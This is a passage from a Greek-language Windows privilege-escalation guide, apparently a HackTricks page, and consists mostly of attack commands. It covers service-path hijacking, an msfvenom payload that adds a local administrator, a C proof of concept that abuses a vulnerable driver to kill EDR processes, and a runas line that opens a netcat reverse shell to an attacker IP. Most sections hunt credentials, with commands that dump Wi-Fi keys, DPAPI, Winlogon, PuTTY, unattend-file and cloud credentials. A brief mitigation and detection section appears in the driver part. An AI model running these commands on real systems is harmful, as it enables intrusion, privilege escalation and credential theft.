reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Μητρώο υπηρεσιών AppendData/AddSubdirectory permissions

Αν έχετε αυτή την άδεια πάνω σε ένα μητρώο, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-μητρώα από αυτό**. Σε περίπτωση των Windows services αυτό είναι **αρκετό για να εκτελεστεί αυθαίρετος κώδικας:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Διαδρομές υπηρεσίας χωρίς εισαγωγικά

Αν η διαδρομή προς ένα εκτελέσιμο δεν είναι μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρουμένων αυτών που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε χειροκίνητα να δημιουργήσετε ένα service binary με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Δράσεις Ανάκτησης

Windows επιτρέπει στους χρήστες να ορίσουν ενέργειες που θα εκτελούνται εάν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Εάν αυτό το binary μπορεί να αντικατασταθεί, μπορεί να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να escalate privileges) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος για να βρείτε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Run at startup

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέροντα **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Ψάξτε για πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Αν ένας driver αποκαλύπτει ένα arbitrary kernel read/write primitive (συνήθες σε κακώς σχεδιασμένους IOCTL handlers), μπορείτε να ανεβάσετε προνόμια κλέβοντας ένα SYSTEM token απευθείας από τη μνήμη του kernel. Δείτε την τεχνική βήμα‑προς‑βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled Object Manager path, η σκόπιμη επιβράδυνση της αναζήτησης (χρησιμοποιώντας max-length components ή βαθιές αλυσίδες directories) μπορεί να επεκτείνει το παράθυρο από μικροδευτερόλεπτα σε δεκάδες μικροδευτερόλεπτα:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Οι σύγχρονες ευπάθειες hive σας επιτρέπουν να διαμορφώσετε deterministic layouts, να καταχραστείτε writable HKLM/HKU descendants, και να μετατρέψετε metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθετε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object τους με ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν FILE_DEVICE_SECURE_OPEN στα DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν η συσκευή ανοίγει μέσω ενός path που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (από ένα πραγματικό περιστατικό)

Μόλις ένας χρήστης μπορεί να ανοίξει τη συσκευή, privileged IOCTLs που εκθέτει ο driver μπορούν να καταχραστούν για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στο wild:
- Επιστροφή full-access handles σε arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω του kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Πάντα ορίζετε FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε αντικείμενα συσκευής που προορίζονται να περιοριστούν από μια DACL.
- Επαληθεύστε το context του καλούντος για λειτουργίες με προνόμια. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διαδικασίας ή την επιστροφή handles.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Detection ideas for defenders
- Παρακολουθείτε user-mode opens ύποπτων device names (e.g., \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδεικνύουν κατάχρηση.
- Επιβάλλετε το vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και διατηρείτε δικές σας λίστες allow/deny.


## PATH DLL Hijacking

If you have **δικαιώματα εγγραφής σε έναν φάκελο που είναι στο PATH** μπορείτε να είστε σε θέση να hijackάρετε μια DLL που φορτώνεται από μια διεργασία και **ανυψώσετε τα προνόμια**.

Ελέγξτε τα δικαιώματα όλων των φακέλων που βρίσκονται στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι σκληροκωδικοποιημένοι στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Ports

Ελέγξτε για **περιορισμένες services** από έξω
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερα[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το εκτελέσιμο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσεις root user μπορείς να ακούς σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσεις `nc.exe` για να ακούσεις σε μια θύρα, θα ρωτήσει μέσω GUI αν το `nc` θα πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Διαπιστευτήρια

### Winlogon Διαπιστευτήρια
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει credentials χρηστών για servers, websites και άλλα προγράμματα, τα οποία το **Windows** μπορεί να **συνδέει αυτόματα τους χρήστες**. Στην πρώτη ανάγνωση, αυτό μπορεί να φαίνεται σαν να μπορούν οι χρήστες να αποθηκεύουν τα Facebook credentials, Twitter credentials, Gmail credentials κ.λπ., ώστε να συνδέονται αυτόματα μέσω browsers. Όμως δεν είναι έτσι.

Το Windows Vault αποθηκεύει credentials που το **Windows** μπορεί να χρησιμοποιήσει για να συνδέει αυτόματα τους χρήστες, πράγμα που σημαίνει ότι οποιαδήποτε **Windows application που χρειάζεται credentials για πρόσβαση σε έναν resource** (server ή website) **μπορεί να κάνει χρήση αυτού του Credential Manager** & Windows Vault και να χρησιμοποιήσει τα αποθηκευμένα credentials αντί οι χρήστες να εισάγουν συνέχεια το username και το password.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα credentials για έναν συγκεκριμένο resource. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το credential manager και να αιτηθεί τα credentials για αυτόν τον resource** από το προεπιλεγμένο storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το ακόλουθο παράδειγμα εκτελεί ένα απομακρυσμένο binary μέσω SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή από το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος για να συμβάλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα στοιχεία σύνδεσης του χρήστη**. Σε σενάρια που αφορούν κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά αυθεντικοποίησης του domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, όταν χρησιμοποιείται το DPAPI, αποθηκεύονται στον κατάλογο %APPDATA%\Microsoft\Protect\{SID}, όπου το {SID} αντιπροσωπεύει το χρήστη [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Το DPAPI key, που συνυπάρχει με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την εμφάνιση του περιεχομένου του με την εντολή `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τις κατάλληλες παραμέτρους (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** βρίσκονται συνήθως σε:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε.\
Μπορείτε να **εξάγετε πολλές DPAPI** **masterkeys** από **memory** με το `sekurlsa::dpapi` module (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell διαπιστευτήρια

Τα **PowerShell διαπιστευτήρια** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης ως τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων με βολικό τρόπο. Τα διαπιστευτήρια προστατεύονται χρησιμοποιώντας **DPAPI**, που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** ένα PS credentials από το αρχείο που το περιέχει μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξάγετε πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Οι χρήστες συχνά χρησιμοποιούν την εφαρμογή StickyNotes σε υπολογιστές Windows για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να αντιλαμβάνονται ότι πρόκειται για αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητήσετε και να το εξετάσετε.

### AppCmd.exe

**Σημείωση ότι για να ανακτήσετε κωδικούς από AppCmd.exe πρέπει να είστε Administrator και να εκτελείστε σε επίπεδο High Integrity.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\  
Εάν αυτό το αρχείο υπάρχει, τότε είναι πιθανό ότι κάποιες **credentials** έχουν ρυθμιστεί και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Έλεγξε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Installers **εκτελούνται με προνόμια SYSTEM**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Μητρώο (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH κλειδιά κεντρικού υπολογιστή
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH κλειδιά στο μητρώο

Τα ιδιωτικά SSH κλειδιά μπορούν να αποθηκευτούν στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε εγγραφή μέσα σε εκείνη την διαδρομή, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Εάν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να συνδεθώ μέσω ssh σε μια μηχανή. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρα κλειδιά.

### Ανεπιτήρητα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Cached GPP Pasword

Μια δυνατότητα υπήρχε προηγουμένως που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain χρήστη. Δεύτερον, οι κωδικοί μέσα σε αυτά τα GPP, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά cache-αρισμένα αρχεία GPP που περιέχουν ένα πεδίο "cpassword" το οποίο δεν είναι κενό. Όταν βρεθεί τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό και επιστρέφει ένα προσαρμοσμένο PowerShell αντικείμενο. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, βοηθώντας στον εντοπισμό και τη διόρθωση αυτής της ευπάθειας ασφαλείας.

